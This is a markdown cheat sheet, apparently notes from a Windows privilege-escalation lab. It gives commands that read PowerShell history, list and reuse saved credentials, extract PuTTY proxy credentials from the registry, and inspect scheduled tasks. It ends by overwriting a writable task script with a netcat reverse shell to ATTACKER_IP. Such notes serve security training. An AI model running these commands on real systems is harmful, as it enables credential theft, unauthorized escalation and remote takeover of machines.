# Powershell History
Tool: cmd ( admin )
> C:\> %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

![image](https://github.com/cyberwh15ky/command/assets/142871997/1f4ccdad-a35f-4327-bd05-5a2fa3b66ba5)

# Saved Windows Credentials
Tool: cmd ( admin )
> C:\> cmdkey /list

![image](https://github.com/cyberwh15ky/command/assets/142871997/f1fa1fff-530b-4b6c-8b30-6b3db45faeb5)

# Try the user login
Tool: cmd ( admin )
> C:\> runas /savecred /user:admin cmd.exe

![image](https://github.com/cyberwh15ky/command/assets/142871997/ae29ae45-a559-4b11-a6d0-3884840a2952)

![image](https://github.com/cyberwh15ky/command/assets/142871997/26305a77-91b3-4550-8d86-d783c0afa33b)

# Retrieve Credentials from Software: PuTTY
Tool: cmd ( admin )
> C:\> reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

![image](https://github.com/cyberwh15ky/command/assets/142871997/fd76849c-6eaa-4f9d-81a9-4c447154b311)

![image](https://github.com/cyberwh15ky/command/assets/142871997/d2c68171-98c8-4b9b-bcc6-423b6458b993)


# Scheduled Tasks
Tool: cmd ( admin )
> C:\> schtasks

![image](https://github.com/cyberwh15ky/command/assets/142871997/8813c1e4-e984-45cb-a054-cd43032a0d96)

## Scheduled Tasks
To retrieve detailed information about any of the services, you can use a command like the following one:
Tool: cmd ( admin )
> C:\> schtasks /query /tn vulntask /fo list /v

![image](https://github.com/cyberwh15ky/command/assets/142871997/d04a7a55-2b46-444e-95ea-0543de58b4f6)


If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use icacls:
Tool: cmd ( admin )
> C:\> icacls c:\tasks\schtask.bat
![image](https://github.com/cyberwh15ky/command/assets/142871997/6d87392a-a9c0-4add-b210-66bb07ebb327)

As can be seen in the result, the BUILTIN\Users group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like. For your convenience, nc64.exe can be found on C:\tools. Let's change the bat file to spawn a reverse shell:
Tool: cmd ( admin )
> C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat

